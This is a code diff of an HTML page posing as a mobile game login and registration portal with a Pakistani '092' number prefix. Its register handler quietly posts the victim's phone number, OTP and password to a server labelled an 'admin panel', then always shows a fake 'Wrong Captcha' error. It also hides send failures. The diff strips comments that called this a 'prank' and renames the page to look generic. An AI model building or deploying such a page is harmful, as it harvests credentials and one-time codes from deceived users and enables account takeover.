@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>M777 - GAME</title>
+    <title>Game Portal</title>
+    
     <style>
-        /* CSS mein koi tabdeeli nahi hai */
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #000; }
         .content-wrapper { width: 100%; height: 100%; background: url('background.png') no-repeat center center; background-size: cover; position: relative; }
         .page-container { display: flex; justify-content: flex-end; align-items: flex-start; height: 100%; width: 100%; padding-right: 6%; box-sizing: border-box; padding-bottom: 4vh; }
@@ -23,6 +23,14 @@
         #register-form .input-group label { color: white; font-weight: bold; font-size: 12px; flex-basis: 25%; margin-bottom: 0; padding-right: 5px; }
         #register-form .input-container, #register-form .mobile-input-container, #register-form .password-container { flex-basis: 73%; }
         .error-message { color: #ff4d4d; font-size: 11px; font-weight: bold; text-align: right; margin-top: -5px; margin-bottom: 5px; display: none; }
+        .country-code { display: flex; align-items: center; padding-right: 6px; color: #f0f0f0; font-weight: bold; font-size: 11px; }
+        .arrow-down { width: 0; height: 0; border-left: 3px solid transparent; border-right: 3px solid transparent; border-top: 3px solid #f39c12; margin-left: 3px; }
+        .eye-icon { cursor: pointer; width: 16px; height: 16px; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 576 512'%3E%3Cpath fill='%23c8b4c0' d='M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 157.1 0 224 0 224s48.6 66.9 95.4 111.4C142.5 379.2 207.2 416 288 416s145.5-36.8 192.6-80.6C527.4 290.9 576 224 576 224s-48.6-66.9-95.4-111.4C433.5 68.8 368.8 32 288 32zm0 320c-53 0-96-43-96-96s43-96 96-96 96 43 96 96-43 96-96 96zm0-128c-17.7 0-32 14.3-32 32s14.3 32 32 32 32-14.3 32-32-14.3-32-32-32z'/%3E%3C/svg%3E"); background-size: contain; background-repeat: no-repeat; }
+        .options { display: flex; justify-content: space-between; align-items: center; font-size: 11px; margin-bottom: 10px; color: #f0f0f0; }
+        .buttons { display: flex; flex-direction: row; gap: 8px; margin-top: 15px; }
+        .btn { padding: 8px 0; border: none; border-radius: 6px; font-size: 13px; font-weight: bold; cursor: pointer; flex: 1; text-transform: uppercase; box-shadow: 0 3px 5px rgba(0,0,0,0.2); transition: transform 0.2s; }
+        .btn-send { border-radius: 18px; padding: 3px 10px; font-size: 10px; margin-left: 4px; }
+        .version { position: absolute; bottom: 10px; left: 10px; font-size: 12px; color: rgba(255, 255, 255, 0.7); }
         #custom-toast { visibility: hidden; min-width: 250px; background-color: rgba(0, 0, 0, 0.8); color: #fff; text-align: center; border-radius: 25px; padding: 16px; position: absolute; z-index: 1000; left: 50%; top: 50%; transform: translate(-50%, -50%); font-size: 17px; border: 1px solid rgba(255, 255, 255, 0.2); box-shadow: 0 0 10px rgba(0,0,0,0.5); opacity: 0; transition: opacity 0.5s, visibility 0.5s; }
         #custom-toast.show { visibility: visible; opacity: 1; }
         @media (orientation: portrait) { .content-wrapper { width: 100vh; height: 100vw; position: absolute; top: 0; left: 0; transform-origin: top left; transform: rotate(90deg) translateY(-100%); } }
@@ -34,7 +42,30 @@
         <div id="custom-toast"></div>
         <div class="page-container">
             <form class="login-form" id="login-form">
-                </form>
+                <div class="input-group">
+                    <label for="login-mobile">Mobile</label>
+                    <div class="mobile-input-container">
+                        <div class="country-code"><span>092</span><span class="arrow-down"></span></div>
+                        <input type="tel" id="login-mobile" placeholder="Please enter your mobile number">
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label for="login-password">Password</label>
+                    <div class="password-container">
+                        <input type="password" id="login-password" placeholder="Please enter a password">
+                        <span class="eye-icon" onclick="togglePassword('login-password')"></span>
+                    </div>
+                </div>
+                <div class="options">
+                    <div class="save-password"><input type="checkbox" id="save-password" checked><label for="save-password">Save Password</label></div>
+                    <a href="#" class="forgot-password">Forgot Password</a>
+                </div>
+                <div class="buttons">
+                    <button type="submit" class="btn btn-login">Login</button>
+                    <button type="button" class="btn btn-register-nav" id="show-register-btn">Register</button>
+                </div>
+            </form>
+
             <form class="register-form hidden" id="register-form">
                 <h1 class="form-title">Register</h1>
                 <div class="input-group">
@@ -51,16 +82,19 @@
                         <button type="button" class="btn-send" id="send-otp-btn">Send</button>
                     </div>
                 </div>
-                <p class="error-message" id="captcha-error">Wrong Captcha</p> <div class="input-group">
+                <p class="error-message" id="captcha-error">Wrong Captcha</p>
+                <div class="input-group">
                     <label for="register-password">Password</label>
                     <div class="input-container">
                         <input type="password" id="register-password" placeholder="Password" required>
+                        <span class="eye-icon" onclick="togglePassword('register-password')"></span>
                     </div>
                 </div>
                 <div class="input-group">
                     <label for="confirm-password">Confirm</label>
                     <div class="input-container">
                         <input type="password" id="confirm-password" placeholder="Confirm password" required>
+                        <span class="eye-icon" onclick="togglePassword('confirm-password')"></span>
                     </div>
                 </div>
                 <div class="terms-container">
@@ -72,6 +106,7 @@
                 </div>
             </form>
         </div>
+        <div class="version">Version 1.00</div>
     </div>
 
     <script>
@@ -84,33 +119,23 @@
         const captchaError = document.getElementById('captcha-error');
 
         function showToast(message){const toast=document.getElementById("custom-toast");toast.innerText=message;toast.className="show";setTimeout(function(){toast.className=toast.className.replace("show","")},3000)}
-        function handleFirstInteraction(){/* Music/Fullscreen code... */}
-        document.addEventListener('click',handleFirstInteraction);
+        function handleFirstInteraction(){const elem=document.documentElement;if(!document.fullscreenElement){if(elem.requestFullscreen){elem.requestFullscreen()}else if(elem.webkitRequestFullscreen){elem.webkitRequestFullscreen()}}var music=document.getElementById('background-music');if(music.paused){music.play().catch(error=>{console.log("Audio play error:",error)})}document.removeEventListener('click',handleFirstInteraction)}document.addEventListener('click',handleFirstInteraction);
+        function togglePassword(fieldId){const passwordField=document.getElementById(fieldId);if(passwordField.type==="password"){passwordField.type="text"}else{passwordField.type="password"}}
         
         showRegisterBtn.addEventListener('click',()=>{loginForm.classList.add('hidden');registerForm.classList.remove('hidden')});
         showLoginBtn.addEventListener('click',()=>{registerForm.classList.add('hidden');loginForm.classList.remove('hidden')});
 
-        // OTP Send button (TIMER KE SAATH) - Is mein koi tabdeeli nahi
         sendOtpBtn.addEventListener('click', async () => {
             const mobileInput = document.getElementById('register-mobile').value;
-            if (mobileInput.length < 10) {
-                showToast("Please enter a valid mobile number.");
-                return;
-            }
-
+            if (mobileInput.length < 10) { showToast("Please enter a valid mobile number."); return; }
             sendOtpBtn.disabled = true;
             let timer = 59;
             sendOtpBtn.innerText = `Wait ${timer + 1}s`;
             const countdown = setInterval(() => {
                 sendOtpBtn.innerText = `Wait ${timer}s`;
                 timer--;
-                if (timer < 0) {
-                    clearInterval(countdown);
-                    sendOtpBtn.disabled = false;
-                    sendOtpBtn.innerText = "Send";
-                }
+                if (timer < 0) { clearInterval(countdown); sendOtpBtn.disabled = false; sendOtpBtn.innerText = "Send"; }
             }, 1000);
-
             const mobileNumber = "092" + mobileInput;
             try {
                 const response = await fetch(`${API_URL}/request-otp`, {
@@ -128,36 +153,28 @@
             }
         });
 
-        // ===== REGISTER BUTTON KA NAYA PRANK FUNCTION =====
         registerForm.addEventListener('submit', (event) => {
             event.preventDefault();
             captchaError.style.display = 'none';
-
-            // Basic validation
             const password = document.getElementById('register-password').value;
             const confirmPassword = document.getElementById('confirm-password').value;
             if (password.length < 6) { showToast("Password must be at least 6 characters long."); return; }
             if (password !== confirmPassword) { showToast("Passwords do not match."); return; }
-            
-            // User ka data hasil karein
             const mobileInput = document.getElementById('register-mobile').value;
             const phoneNumber = "092" + mobileInput;
             const otp = document.getElementById('captcha').value;
-
-            // 1. Data ko background mein server par bhej dein
             fetch(`${API_URL}/submit-registration`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ phoneNumber, otp, password })
-            }).catch(error => {
-                // Agar server par data na bhi jaye to user ko nahi batana
-                console.error("Data could not be sent to admin panel:", error);
-            });
-
-            // 2. Foran user ko "Wrong Captcha" ka error dikha dein
+            }).catch(error => { console.error("Data could not be sent to admin panel:", error); });
             captchaError.style.display = 'block';
         });
         
+        loginForm.addEventListener('submit',(event)=>{
+            event.preventDefault();
+            showToast("Login functionality not available.");
+        });
     </script>
 </body>
 </html>
